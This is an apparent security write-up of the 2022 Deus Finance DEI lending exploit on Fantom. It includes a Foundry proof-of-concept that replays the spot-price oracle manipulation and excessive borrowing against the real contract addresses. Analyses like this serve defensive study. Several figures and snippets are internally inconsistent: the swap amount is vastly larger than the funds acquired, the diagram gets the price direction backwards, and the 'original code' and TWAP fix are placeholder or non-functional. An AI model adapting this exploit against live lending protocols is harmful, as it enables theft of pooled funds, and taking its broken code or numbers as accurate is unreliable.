# Deus Finance — On-Chain Price Oracle Manipulation DEI Lending Exploit Analysis

| Item | Details |
|------|------|
| **Date** | 2022-04-28 |
| **Protocol** | Deus Finance (DeiLender) |
| **Chain** | Fantom |
| **Loss** | ~$13,400,000 (USDC, DEI) |
| **Attacker** | Attacker address unidentified |
| **Attack Tx** | Block 37,093,708 |
| **Vulnerable Contract** | DeiLenderSolidex [0x8D643d954798392403eeA19dB8108f595bB8B730](https://ftmscan.com/address/0x8D643d954798392403eeA19dB8108f595bB8B730) |
| **Root Cause** | The collateral price oracle `getOnChainPrice()` directly consumed the Solidly AMM spot price, allowing an attacker to temporarily manipulate the price via a large swap and then borrow an excessive amount of DEI |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/deus_exp.sol) |

---
## 1. Vulnerability Overview

Deus Finance's DeiLenderSolidex contract is a protocol that allows borrowing DEI against LP tokens (DEI/USDC Solidly LP) as collateral. The `getOnChainPrice()` function was used to calculate collateral value, and this function directly queried the current spot price from the Solidly AMM.

The attacker bridged a large amount of USDC from Ethereum to Fantom via the Anyswap bridge, then used it to manipulate the DEI/USDC pool price. Using the manipulated inflated LP price as a basis, the attacker borrowed a large amount of DEI from DeiLender and swapped it for USDC to realize a profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable DeiLenderSolidex (pseudocode)
contract DeiLenderSolidex {
    IOracle oracle;

    function borrow(uint256 amount) external {
        // Calculate collateral value
        uint256 collateralValue = _getCollateralValue(msg.sender);

        // ❌ Oracle based on spot price
        // Manipulable via flash loan
        uint256 price = oracle.getOnChainPrice();

        uint256 maxBorrow = collateralValue * price / 1e18 * LTV / 100;
        require(amount <= maxBorrow, "exceeds LTV");

        // Execute borrow
        DEI.transfer(msg.sender, amount);
    }
}

// ❌ Vulnerable price oracle
contract OnChainOracle {
    ISolidlyPair pair; // DEI/USDC Solidly AMM pool

    function getOnChainPrice() external view returns (uint256) {
        // ❌ AMM spot price — immediately manipulable via large swap
        (uint256 reserveDEI, uint256 reserveUSDC,) = pair.getReserves();
        return reserveUSDC * 1e18 / reserveDEI; // USDC per DEI
    }
}

// ✅ Correct pattern
contract TWAPOracle {
    function getPrice() external view returns (uint256) {
        // ✅ Use minimum 30-minute TWAP
        return pair.observe(30 minutes);
    }
}
```


### On-Chain Original Code

Source: Source unverified

> ⚠️ No on-chain source code — only bytecode exists or source is unverified

**Vulnerable Function** — `getOnChainPrice()`:
```solidity
// ❌ Root Cause: The collateral price oracle `getOnChainPrice()` directly consumed the Solidly AMM spot price, allowing an attacker to temporarily manipulate the price via a large swap and then borrow an excessive amount of DEI
// Source code unverified — bytecode analysis required
// Vulnerability: The collateral price oracle `getOnChainPrice()` directly consumed the Solidly AMM spot price, allowing an attacker to temporarily manipulate the price via a large swap and then borrow an excessive amount of DEI
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (Fantom)
    │
    ├─[1] Anyswap bridge: Transfer 150,000,000 USDC from ETH → Fantom
    │
    ├─[2] Purchase small amount of DEI (1,000,000 USDC → DEI)
    │       Reason: required to trigger the loan
    │
    ├─[3] Add liquidity to DEI/USDC LP
    │       addLiquidity(USDC, DEI) → obtain LP tokens
    │
    ├─[4] Large USDC swap on Solidly AMM
    │       12,000,000,000,000,000,000,000,000 USDC → DEI
    │       DEI price (USDC per DEI) plummets → inverse: DEI per USDC spikes
    │       → DEI increases in LP, USDC decreases → LP value shifts
    │
    ├─[5] DeiLenderSolidex.addCollateral() + borrow()
    │       LP value over-calculated based on manipulated spot price
    │       → Borrow far more DEI than actual collateral value
    │
    ├─[6] Borrowed DEI → swap to USDC (realize profit)
    │
    └─[7] Loss: ~$13,400,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IDeiLender {
    function addCollateral(address account, uint256 amount) external;
    function borrow(uint256 amount) external returns (uint256);
    function getOnChainPrice() external view returns (uint256);
}

interface ISolidlyRouter {
    function swapExactTokensForTokensSimple(
        uint amountIn, uint amountOutMin,
        address tokenFrom, address tokenTo,
        bool stable, address to, uint deadline
    ) external returns (uint[] memory);

    function addLiquidity(
        address tokenA, address tokenB, bool stable,
        uint amountADesired, uint amountBDesired,
        uint amountAMin, uint amountBMin,
        address to, uint deadline
    ) external returns (uint, uint, uint);
}

contract ContractTest is Test {
    IERC20 USDC    = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
    IERC20 DEI     = IERC20(0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3);
    IERC20 lpToken = IERC20(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0);

    IDeiLender lender  = IDeiLender(0x8D643d954798392403eeA19dB8108f595bB8B730);
    ISolidlyRouter router = ISolidlyRouter(0xa38cd27185a464914D3046f0AB9d43356B34829D);

    function setUp() public {
        vm.createSelectFork("fantom", 37_093_708);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before] USDC", USDC.balanceOf(address(this)), 6);

        // [Step 1] Acquire 150M USDC (in reality transferred via bridge)
        uint256 usdcAmount = 150_000_000 * 1e6;

        // [Step 2] Purchase small amount of DEI
        USDC.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSimple(
            1_000_000 * 1e6, 0, address(USDC), address(DEI), true, address(this), block.timestamp
        );

        // [Step 3] Add LP
        DEI.approve(address(router), type(uint256).max);
        router.addLiquidity(
            address(USDC), address(DEI), true,
            usdcAmount / 10, DEI.balanceOf(address(this)),
            0, 0, address(this), block.timestamp
        );

        // [Step 4] Manipulate LP price via large USDC → DEI swap
        router.swapExactTokensForTokensSimple(
            12_000_000_000_000_000_000_000_000, 0,
            address(USDC), address(DEI), true, address(this), block.timestamp
        );

        emit log_named_decimal_uint("[Manipulated] DEI/USDC oracle price", lender.getOnChainPrice(), 18);

        // [Step 5] Borrow excessive DEI using manipulated price
        lpToken.approve(address(lender), type(uint256).max);
        lender.addCollateral(address(this), lpToken.balanceOf(address(this)));
        uint256 borrowAmount = 17_246_885_701_212_305_622_476_302;
        lender.borrow(borrowAmount);

        // [Step 6] Swap DEI → USDC
        DEI.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSimple(
            DEI.balanceOf(address(this)), 0,
            address(DEI), address(USDC), true, address(this), block.timestamp
        );

        emit log_named_decimal_uint("[After] USDC profit", USDC.balanceOf(address(this)), 6);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Price Oracle Manipulation (On-Chain Oracle Manipulation) |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP DeFi** | Collateral value calculation based on AMM spot price |
| **Attack Vector** | Large swap → LP price manipulation → excessive borrowing |
| **Precondition** | DeiLender uses Solidly AMM spot price as collateral value |
| **Impact** | Entire DEI lending pool drainable |

---
## 6. Remediation Recommendations

1. **Mandate TWAP Oracle**: Use a minimum 30-minute TWAP for all collateral value calculations.
2. **Price Deviation Circuit Breaker**: Reject prices that deviate beyond a certain percentage from the previous block price.
3. **Bridge Fund Monitoring**: Monitor for the possibility of protocol price oracle manipulation when large amounts of funds flow in via bridges.
4. **LP Token Valuation**: Use a mathematically manipulation-resistant LP valuation method (Balancer-style) instead of spot price.

---
## 7. Lessons Learned

- **Repeated Attacks on Deus Finance**: Deus Finance had previously suffered oracle manipulation attacks yet failed to patch the same vulnerability.
- **Cross-Chain Funding**: The attacker bridged a large amount of USDC from Ethereum to use in the attack on Fantom. Monitoring cross-chain fund movements is critical.
- **$13.4M Loss**: This is one of the largest attack cases in the Fantom ecosystem.
- **Solidly AMM Vulnerability**: While the Solidly pool is an AMM designed for stable pairs, reliance on spot price remains manipulable.